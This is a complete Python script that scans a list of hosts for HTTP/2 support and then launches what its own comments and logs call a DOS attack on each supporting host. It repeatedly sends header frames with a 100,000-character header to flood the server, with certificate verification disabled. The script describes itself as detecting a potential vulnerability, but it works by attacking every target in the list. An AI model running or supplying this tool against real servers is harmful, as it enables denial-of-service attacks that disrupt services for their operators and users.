import asyncio
import argparse
import aiohttp
import aiodns
import logging
import ssl
import socket
import ipaddress
from urllib.parse import urlparse
from h2 import connection, config

# Set default socket timeout
socket.setdefaulttimeout(5)

# Define constants
USER_AGENT = "Custom User-Agent"
LARGE_HEADER_VALUE = 'A' * 100000

# Configure logging
logging.basicConfig(filename='http_version_check.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

async def check_http2(url):
    parsed_url = urlparse(url)
    HOST = parsed_url.hostname
    PORT = parsed_url.port if parsed_url.port else 443

    ssl_context = ssl.create_default_context()
    ssl_context.check_hostname = False
    ssl_context.verify_mode = ssl.CERT_NONE
    ssl_context.set_alpn_protocols(['h2', 'spdy/3', 'http/1.1'])

    # Use try-except block for better error handling
    try:
        conn = await asyncio.to_thread(
            ssl_context.wrap_socket,
            socket.socket(socket.AF_INET, socket.SOCK_STREAM),
            server_hostname=HOST
        )
        conn.connect((HOST, PORT))
        pp = conn.selected_alpn_protocol()
        return pp == "h2"
    except Exception as e:
        logging.error(f"Error occurred while checking HTTP version for {url}: {e}")
        return False

async def check_http_version(session, target_with_port, resolver, allow_private):
    target, port = target_with_port
    
    if await validate_ip(target) or await is_resolvable_async(target, allow_private, resolver):
        if port:
            url_https = f"https://{target}:{port}"
        else:
            url_https = f"https://{target}"
        urls = [url_https]
    else:
        logging.error(f"Cannot resolve or validate {target}")
        urls = [f"https://{target}:{port}"]

    for url in urls:
        try:
            http2 = await check_http2(url)
            return url, http2
        except Exception as e:
            logging.error(f"Error occurred while checking HTTP version for {url}: {e}")
            continue

    return urls[0], "Failed to establish connection (both HTTP and HTTPS)"

async def validate_ip(ip):
    loop = asyncio.get_running_loop()
    try:
        await loop.run_in_executor(None, ipaddress.ip_address, ip)
        return True
    except ValueError:
        return False

async def is_resolvable_async(domain, allow_private, resolver):
    try:
        result = await resolver.query(domain, 'A')
        if result:
            ip_address = str(result[0].host)
            if allow_private or not ipaddress.ip_address(ip_address).is_private:
                return True
    except (aiodns.error.DNSError, ValueError):
        pass
    return False


def read_targets(filename):
    targets_with_ports = []
    with open(filename, "r") as file:
        for line in file:
            line = line.strip()
            if ":" in line:
                target, port = line.split(":")
                targets_with_ports.append((target, port))
            else:
                targets_with_ports.append((line, ""))
    return targets_with_ports

async def check_dos(url, port):
    sock = socket.create_connection((url, port))

    context = ssl.create_default_context()
    context.set_alpn_protocols(['h2'])
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    sock = context.wrap_socket(sock, server_hostname=url)

    cfg = config.H2Configuration(client_side=True)
    conn = connection.H2Connection(config=cfg)
    conn.initiate_connection()

    headers = [(':method', 'GET'), (':authority', url), (':path', '/'), (':scheme', 'https'), ('User-Agent', USER_AGENT) ]
    # Create a lot of big headers to flood the server with CONTINUATION frames
    headers.extend([('LargeHeader', LARGE_HEADER_VALUE)])  

    # Counter to track successful packet sends
    success_count = 0

    while True:
        conn.send_headers(
            conn.get_next_available_stream_id(),
            headers
        )
        sock.send(conn.data_to_send())

        # Increase the success count if packet sending is successful
        success_count += 1

        # Wait for 15 seconds of successful packet sending
        if success_count >= 150:  # Assuming each successful packet send takes 0.1 seconds
            logging.info("Potential vulnerability detected on %s:%s", url, port)
            break

    # Close the socket
    sock.close()
    
    
async def main():
    parser = argparse.ArgumentParser(description="Check HTTP version of target IP addresses or domain names.")
    parser.add_argument("filename", help="Path to the file containing IP addresses or domain names (one per line)")
    args = parser.parse_args()

    # Read targets from file
    targets_with_ports = read_targets(args.filename)

    # Create DNS resolver
    resolver = aiodns.DNSResolver()

    allow_private = False

    try:
        # Use asyncio.gather to run tasks concurrently
        async with aiohttp.ClientSession() as session:
            tasks = [check_http_version(session, target_with_port, resolver, allow_private) for target_with_port in targets_with_ports]
            results = await asyncio.gather(*tasks)

            for url, http2 in results:
                print(f"{url}, http2:{http2}")
                logging.info(f"{url}, http2:{http2}")

            # Perform DOS attack on targets supporting HTTP/2
            for url, http2 in results:
                if http2:
                    parsed_url = urlparse(url)
                    host = parsed_url.hostname
                    port = parsed_url.port if parsed_url.port else 443
                    logging.info("Trying to DOS target: %s", host)
                    try:
                        await check_dos(host, port)
                    except BrokenPipeError:
                        logging.error("Broken pipe error occurred while performing DOS attack on %s. Skipping to the next target.", host)
    except Exception as e:
        logging.error(f"An error occurred during execution: {e}")

if __name__ == "__main__":
    asyncio.run(main())